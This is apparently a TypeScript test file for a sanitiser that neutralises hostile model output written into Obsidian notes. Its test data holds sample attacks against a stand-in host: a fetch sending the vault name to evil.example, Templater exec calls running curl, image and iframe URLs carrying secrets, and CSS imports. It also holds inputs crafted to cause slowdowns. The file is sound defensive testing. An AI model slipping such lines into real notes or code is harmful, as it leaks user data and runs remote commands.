import { describe, expect, test } from "bun:test";
import { prepareModelOutputForWrite } from "../src/safety/writePath";

const ZWSP = "\u200B";

/**
 * A replace-scope write leaves alone the constructs that the replaced text already held. These tests keep the start of
 * a construct the source held, change the rest, and expect the result to be neutralised: a construct is identified by
 * its whole text, never by the first characters that happen to be shown in the interface.
 */
const write = (output: string, sourceText: string) => prepareModelOutputForWrite(output, { sourceText });

describe("exemptions compare the whole construct, not its first characters", () => {
	test("a dataviewjs block keeps its exemption only when every line is the same", () => {
		const source = "```dataviewjs\ndv.paragraph('hi')\n```";
		expect(write(source, source)).toEqual({ text: source, changed: false, findings: [] });
		const grown = "```dataviewjs\ndv.paragraph('hi')\nawait app.vault.adapter.write('x.md', 'pwned')\n```";
		const result = write(grown, source);
		expect(result.changed).toBe(true);
		expect(result.text).toStartWith("```text\n");
		expect(result.findings.map((finding) => finding.kind)).toEqual(["plugin-fence"]);
	});

	test("the same opener and first line with a rewritten body is neutralised", () => {
		const source = "```dataviewjs\nconst pages = dv.pages()\ndv.list(pages)\n```";
		const rewritten = "```dataviewjs\nconst pages = dv.pages()\nfetch('https://evil.example/?d=' + encodeURIComponent(app.vault.getName()))\n```";
		const result = write(rewritten, source);
		expect(result.text).toStartWith("```text\n");
		expect(result.changed).toBe(true);
	});

	test("a plugin block is compared as a whole when the model drops its closing fence", () => {
		const source = "```dataviewjs\ndv.paragraph('hi')\n```\n\nAfter.";
		const result = write("```dataviewjs\ndv.paragraph('hi')\n\nAfter.\nawait evil()", source);
		expect(result.text).toStartWith("```text\n");
	});

	test("a Templater tag keeps its exemption only when the whole tag is the same", () => {
		const prefix = `<% tp.file.title + "${"a".repeat(70)}`;
		const source = `${prefix}" %>`;
		expect(write(source, source).changed).toBe(false);
		const extended = `${prefix}" + (await tp.system.exec("curl evil.example")) %>`;
		const result = write(extended, source);
		expect(result.text).toStartWith(`<${ZWSP}%`);
		expect(result.findings.map((finding) => finding.kind)).toEqual(["template-tag"]);
	});

	test("a Templater tag that runs over several lines is compared in full", () => {
		const source = "<%*\ntR += 'a'\n%>";
		expect(write(source, source).changed).toBe(false);
		expect(write("<%*\ntR += 'a'\nawait tp.system.exec('curl evil.example')\n%>", source).text).toStartWith(`<${ZWSP}%*`);
	});

	test("a remote image keeps its exemption only when the whole destination is the same", () => {
		const url = `https://cdn.example.com/${"p".repeat(300)}.png`;
		const source = `![x](${url})`;
		expect(write(source, source).changed).toBe(false);
		const result = write(`![x](${url}?d=SECRET_DATA_HERE)`, source);
		expect(result.text).toStartWith("[Remote image: x](");
		expect(result.findings.map((finding) => finding.kind)).toEqual(["remote-image"]);
	});

	test("a rewritten caption on a kept remote image does not matter", () => {
		const source = "![A cat](https://cdn.example.com/cat.png)";
		expect(write("![Un chat](https://cdn.example.com/cat.png)", source).changed).toBe(false);
	});

	test("a reference definition is compared by its whole destination", () => {
		const url = `https://cdn.example.com/${"p".repeat(300)}.png`;
		const source = `![x][r]\n\n[r]: ${url}`;
		expect(write(source, source).changed).toBe(false);
		const result = write(`![x][r]\n\n[r]: ${url}?d=SECRET`, source);
		expect(result.text).toContain("[r\\]: ");
		expect(result.findings.some((finding) => finding.kind === "remote-image")).toBe(true);
	});

	test("an HTML tag keeps its exemption only when the whole tag is the same", () => {
		const src = `https://a.example/${"p".repeat(120)}`;
		const source = `<iframe src="${src}"></iframe>`;
		expect(write(source, source).changed).toBe(false);
		const result = write(`<iframe src="${src}?d=SECRET"></iframe>`, source);
		expect(result.text).toStartWith("&lt;iframe");
	});

	test("an element is compared with its content, so a kept style tag cannot get a new rule", () => {
		const source = "<style>.a { color: red }</style>";
		expect(write(source, source).changed).toBe(false);
		const result = write("<style>.a { color: red } @import 'https://evil.example/x.css';</style>", source);
		expect(result.text).toStartWith("&lt;style>");
		expect(write("<code>$= app.vault.getName()</code>", "<code>x</code>").text).toStartWith("&lt;code>");
	});

	test("an element that is not closed in sight is never exempt", () => {
		const source = "<style>.a { color: red }";
		expect(write(source, source).text).toStartWith("&lt;style>");
	});

	test("an unsafe diagram keeps its exemption only when the whole source is the same", () => {
		const body = `%%{init: {"theme": "dark"}}%%\nflowchart TD\n  A["${"x".repeat(240)}"] --> B`;
		const source = `\`\`\`mermaid\n${body}\n\`\`\``;
		expect(write(source, source).changed).toBe(false);
		const appended = `\`\`\`mermaid\n${body}\n  %%{init: {"themeCSS": "@import url(https://evil.example/x.css)"}}%%\n\`\`\``;
		const result = write(appended, source);
		expect(result.text).toStartWith("```text\n");
		expect(result.findings.map((finding) => finding.kind)).toEqual(["unsafe-diagram"]);
	});

	test("a blocked link keeps its exemption only when the whole destination is the same", () => {
		const target = `obsidian://open?vault=${"v".repeat(300)}`;
		const source = `[open](${target})`;
		expect(write(source, source).changed).toBe(false);
		expect(write(`[open](${target}&x=1)`, source).text).toContain("\\(");
	});

	test("an inline Dataview span is compared in full", () => {
		const query = `= this.file.name + "${"a".repeat(260)}"`;
		const source = `Inline \`${query}\` here.`;
		expect(write(source, source).changed).toBe(false);
		expect(write(`Inline \`${query} + dv.current()\` here.`, source).changed).toBe(true);
	});

	test("a MathJax command is compared up to the end of its paragraph", () => {
		const source = "$\\href{https://a.example/ok}{x}$";
		expect(write(source, source).changed).toBe(false);
		expect(write("$\\href{https://evil.example/?d=SECRET}{x}$", source).changed).toBe(true);
	});

	test("a construct too long to read in full is never exempt", () => {
		const url = `https://cdn.example.com/${"p".repeat(5000)}.png`;
		const source = `![x](${url})`;
		expect(write(source, source).changed).toBe(true);
	});

	test("the limit on how many copies the source held is still honoured", () => {
		const source = "Keep <% tp.date.now() %>.";
		const result = write("Keep <% tp.date.now() %>.\nKeep <% tp.date.now() %>.", source);
		expect(result.text.match(/<%/g)?.length).toBe(1);
	});

	test("an exemption survives the repeated passes the sanitiser may need", () => {
		const source = "<style>.a { color: red }</style>\n\n```dataviewjs\ndv.paragraph('mine')\n```";
		expect(write(source, source)).toEqual({ text: source, changed: false, findings: [] });
	});

	// Comparing whole constructs, repeating passes and tracking nesting must not add a quadratic path.
	const repeat = (unit: string, count: number, separator = ""): string => Array.from({ length: count }, () => unit).join(separator);
	const hostile: Record<string, string> = {
		"20,000 unclosed style tags": repeat("<style>", 20_000),
		"20,000 unclosed code tags": repeat("<code>x", 20_000),
		"20,000 template tags": repeat("<% x ", 20_000),
		"8,000 stacked plugin fences": repeat("```dataviewjs", 8000, "\n"),
		"8,000 nested plugin fences": repeat("- ```dataviewjs", 8000, "\n"),
		"4,000 nested diagrams": repeat("> ```mermaid\n> flowchart TD", 4000, "\n"),
		"8,000 indented dataview lines": repeat("    =x", 8000, "\n"),
		"10,000 long-destination images": repeat(`![a](https://e.example/${"p".repeat(30)}.png) `, 10_000),
		"2,000 alternating HTML lines and fences": repeat("<div>\n```js\n![a](https://e.example/x.png)\n```\n\n", 2000),
		"a chain of 3,000 nested list items": `${Array.from({ length: 3000 }, (_, index) => `${" ".repeat(Math.min(index * 2, 200))}- item\n`).join("")}\`\`\`js\nx\n\`\`\``
	};

	for (const [name, text] of Object.entries(hostile)) {
		test(`stays fast on ${name}`, () => {
			const started = performance.now();
			prepareModelOutputForWrite(text, { sourceText: text });
			prepareModelOutputForWrite(text);
			expect(performance.now() - started).toBeLessThan(750);
		});
	}

	test("findings carry the whole construct next to the clipped excerpt", () => {
		const url = `https://cdn.example.com/${"p".repeat(300)}.png`;
		const finding = prepareModelOutputForWrite(`![x](${url})`).findings[0];
		expect(finding.excerpt.length).toBeLessThanOrEqual(240);
		expect(finding.identity).toBe(`](${url})`);
	});
});
